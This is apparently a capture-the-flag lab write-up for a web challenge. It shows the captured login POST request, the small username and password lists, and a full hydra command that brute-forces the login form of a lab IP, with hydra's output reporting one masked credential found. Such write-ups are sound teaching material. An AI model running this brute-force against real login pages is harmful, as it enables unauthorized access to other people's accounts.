#  [Day 3] Web Exploitation Christmas Chaos 
After deploying the machine we browse to the assigned ip.
Here we're greeted with a login screen.
Opening the network monitor in our browser (`Ctrl+Shift+E`) and trying to login with the credentials:
```
Username: test
Password: test
```
We grab the `POST`request:
```
POST /login HTTP/1.1
Host: 10.10.148.71
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

Using hydra we can bruteforce the login form. 
But first we create two files containing the potential usernames and passwords given in the task.
```
kali@kali:/tmp$ printf "root\nadmin\nuser\n" > users
kali@kali:/tmp$ printf "root\npassword\n12345\n" > pass
```

Using hydra we run:
```
hydra -L users -P pass 10.10.148.71 http-post-form "/login:username=^USER^&password=^PASS^:Your username is incorrect."
```
And get:
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-06 15:12:05
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking http-post-form://10.10.148.71:80/login:username=^USER^&password=^PASS^:Your username is incorrect.
[80][http-post-form] host: 10.10.148.71   login: *****   password: *****
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-06 15:12:06
```
Using these credentials we can login and get the flag.
